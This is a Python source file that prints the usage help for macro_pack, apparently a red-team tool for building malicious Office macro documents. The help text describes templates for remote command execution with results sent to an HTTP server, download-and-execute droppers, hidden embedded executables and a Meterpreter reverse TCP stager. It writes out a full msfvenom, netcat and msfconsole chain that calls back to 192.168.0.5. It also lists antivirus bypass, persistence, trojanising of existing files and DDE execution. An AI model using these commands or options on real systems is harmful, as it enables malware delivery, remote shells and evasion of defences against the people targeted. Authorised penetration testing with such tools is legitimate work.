#!/usr/bin/python3
# encoding: utf-8

from termcolor import colored


def printTemplatesUsage(banner, currentApp):
    print(colored(banner, 'green'))
    templatesInfo = \
r"""
      == Template usage ==
      
    Templates can be called using  -t, --template=TEMPLATE_NAME combined with other options.
    Available templates:
    
                --------------------  
                
        HELLO  
        Just print a hello message and awareness about macro
        Give this template the name or email of the author 
          -> Example: echo "@Author" | %s -t HELLO -G hello.pptm
          
                -------------------- 
        
        CMD
        Execute a command line and send result to remote http server
        Give this template the server url and the command to run
          -> Example:  echo "http://192.168.0.5:7777" "dir /Q C:" | %s -t CMD -o -G cmd.doc
          
                --------------------
                    
        DROPPER
        Download and execute a file
        Give this template the file url and the target file path
          -> Example:  echo <file_to_drop_url> "<download_path>" | %s -t DROPPER -o -G dropper.xls
          
                --------------------
                
        DROPPER2
        Download and execute a file. File attributes are also set to system, read-only, and hidden
        Give this template the file url and the target file path
          -> Example:  echo <file_to_drop_url> "<download_path>" | %s -t DROPPER2 -o -G dropper.xlsm
          
                --------------------  
                
        DROPPER_PS
        Download and execute Powershell script using rundll32 (to bypass blocked powershell.exe)
        Note: This payload will download PowerShdll from Github.
        Give this template the url of the powershell script you want to run
         -> Example:  echo "<powershell_script_url>" | %s -t DROPPER_PS -o -G powpow.doc
         
                --------------------  
                
        DROPPER_DLL
        Download a DLL with another extension and run it using Office VBA 
          -> Example, load meterpreter DLL using Office:  
        
        REM Generate meterpreter dll payload
        msfvenom.bat  -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f dll -o meter.dll
        REM Make it available on webserver, ex using netcat on port 6666
        { echo -ne "HTTP/1.0 200 OK\r\n\r\n"; cat meter.dll; } | nc -l -p 6666 -q1
        REM Create Office file which will download DLL and call it
        REM The DLL URL is http://192.168.0.5:6666/normal.html and it will be saved as .asd file
        echo "http://192.168.0.5:6666/normal.html" Run | %s -t DROPPER_DLL -o -G meterdll.xls
         
                --------------------  
                          
        METERPRETER  
        Meterpreter reverse TCP template using MacroMeter by Cn33liz.
        This template is CSharp Meterpreter Stager build by Cn33liz and embedded within VBA using DotNetToJScript from James Forshaw
        Give this template the IP and PORT of listening mfsconsole
         -> Example: echo <ip> <port> | %s -t METERPRETER -o -G meter.docm 
         
        Recommended msfconsole options (use exploit/multi/handler):
        set PAYLOAD windows/meterpreter/reverse_tcp
        set AutoRunScript post/windows/manage/smart_migrate
        set EXITFUNC thread
        set EnableUnicodeEncoding true
        set EnableStageEncoding true
        set ExitOnSession false
        
        Warning: This will crash Office if Office 64bit is installed!
        
                --------------------  
        
        EMBED_EXE
        Will encode an executable inside the vba. When macro is played, exe will be decoded and executed (hidden) on file system.
        This template is inspired by https://github.com/khr0x40sh/MacroShop
        Give this template the path to exe you want to embed in vba and, optionaly, the path where exe should be extracted
        If extraction path is not given, exe will be extracted with random name in current path. 
         -> Example1: echo "path\\to\my_exe.exe" | %s  -t EMBED_EXE -o -G my_exe.xlsm
         -> Example2: echo "path\\to\my_exe.exe" "D:\\another\path\your_exe.exe" | %s  -t EMBED_EXE -o -G my_exe.xlsm

                --------------------  
""" % (currentApp,currentApp,currentApp,currentApp,currentApp,currentApp,currentApp,currentApp, currentApp)
    print(templatesInfo)
    
    

def printUsage(banner, currentApp, mpSession):
    print(colored(banner, 'green'))
    print(" Usage 1: %s  -f input_file_path [options] " % currentApp)
    print(" Usage 2: cat input_file_path | %s [options] " %currentApp)
    proDetails = ""
    if mpSession.mpType == "Pro":
        proDetails = \
"""
    --vbom-encode   Use VBA self encoding to bypass antimalware detection and enable VBOM access (will exploit VBOM self activation vuln). 
                  --start-function option may be needed.
    --av-bypass  Use various tricks  efficient to bypass most av (combine with -o for best result)
    --keep-alive    Use with --vbom-encode option. Ensure new app instance will stay alive even when macro has finished
    --persist       Use with --vbom-encode option. Macro will automatically be persisted in application startup path 
        (works with Excel documents only). The macro will be then be executed anytime an Excel document is opened.
    -T, --trojan=OUTPUT_FILE_PATH   Inject macro in an existing MS office file. 
        Supported files are the same as for the -G option
        If file does not exist, it will be created (like -G option)
    --stealth      Anti-debug and hiding features
    --dcom=REMOTE_FILE_PATH Open remote document using DCOM for pivot/remote exec if psexec not possible for example.
        This will trigger AutoOpen/Workbook_Open automatically. 
        If no auto start function, use --start-function option to indicate which macro to run.
"""

    details = \
"""
 All options:
    -f, --input-file=INPUT_FILE_PATH A VBA macro file or file containing params for --template option 
        If no input file is provided, input must be passed via stdin (using a pipe).
        
    -q, --quiet \tDo not display anything on screen, just process request. 
    
    -o, --obfuscate \tSame as '--obfuscate-form --obfuscate-names --obfuscate-strings'
    --obfuscate-form\tModify readability by removing all spaces and comments in VBA
    --obfuscate-strings\tRandomly split strings and encode them
    --obfuscate-names \tChange functions, variables, and constants names
    
    -s, --start-function=START_FUNCTION   Entry point of macro file 
        Note that macro_pack will automatically detect AutoOpen, Workbook_Open, or Document_Open  as the start function
        
    -t, --template=TEMPLATE_NAME    Use VBA template already included in %s.
        Available templates are: HELLO, CMD, DROPPER, DROPPER2, DROPPER_PS, DROPPER_DLL, METERPRETER, EMBED_EXE 
        Help for template usage: %s -t help
         
    -G, --generated=OUTPUT_FILE_PATH. Generates a file containing the macro. Will guess the format based on extension.
        Supported extensions are: vba, vbs, hta, doc, docm, docx, xls, xlsm, pptm, vsd, vsdm.
        Note: Apart from vba, vbs, and hta which are text files, all other extension requires Windows OS with right MS Office application installed.
    
    --dde  Dynamic Data Exchange attack mode. Input will be inserted as a cmd command and executed via DDE
         DDE attack mode is not compatible with VBA Macro related options.
         Usage: echo calc.exe | %s --dde -G DDE.docx
         Note: This option requires Windows OS with genuine MS Office installed. 
    
    --run=FILE_PATH Open document using COM to run macro. Can be useful to bypass whitelisting situations.
           This will trigger AutoOpen/Workbook_Open automatically. 
           If no auto start function, use --start-function option to indicate which macro to run. 
           
    -l, --listen=PORT Open an HTTP server listening on defined port.
               
""" % (currentApp,currentApp, currentApp)   

    details +=proDetails
    details +="    -h, --help   Displays help and exit"
    details += \
"""

 Notes:
    If no output file is provided, the result will be displayed on stdout.
    Combine this with -q option to pipe only processed result into another program
    ex: %s -f my_vba.vba -o -q | another_app
    Another valid usage is:
    cat input_file.vba | %s -o -q  > output_file.vba 
    
  Have a look at README.md file for more details and usage!
    
""" % (currentApp,currentApp)   
    print(details)